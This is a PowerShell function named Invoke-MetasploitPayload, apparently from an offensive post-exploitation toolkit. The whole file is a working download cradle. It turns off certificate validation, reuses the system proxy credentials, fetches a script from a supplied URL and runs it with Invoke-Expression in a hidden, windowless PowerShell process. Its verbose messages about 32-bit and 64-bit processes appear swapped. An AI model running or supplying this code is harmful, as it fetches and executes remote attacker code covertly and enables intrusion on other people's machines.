function Invoke-MetasploitPayload 
{


[CmdletBinding()]
Param
(
    [Parameter( Mandatory = $True)]
    [ValidateNotNullOrEmpty()]
    [string]$url
)

    Write-Verbose "[*] Creating Download Cradle script using $url"
    $DownloadCradle ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'
    
    Write-Verbose "[*] Figuring out if we're starting from a 32bit or 64bit process.."
    if([IntPtr]::Size -eq 4)
    {
        Write-Verbose "[*] Looks like we're 64bit, using regular powershell.exe"
        $PowershellExe = 'powershell.exe'
    }
    else
    {
        Write-Verbose "[*] Looks like we're 32bit, using syswow64 powershell.exe"
        $PowershellExe=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
    };
    
    Write-Verbose "[*] Creating Process Object.."
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName=$PowershellExe
    $ProcessInfo.Arguments="-nop -c $DownloadCradle"
    $ProcessInfo.UseShellExecute = $False
    $ProcessInfo.RedirectStandardOutput = $True
    $ProcessInfo.CreateNoWindow = $True
    $ProcessInfo.WindowStyle = "Hidden"
    Write-Verbose "[*] Kicking off download cradle in a new process.."
    $Process = [System.Diagnostics.Process]::Start($ProcessInfo)
    Write-Verbose "[*] Done!"
}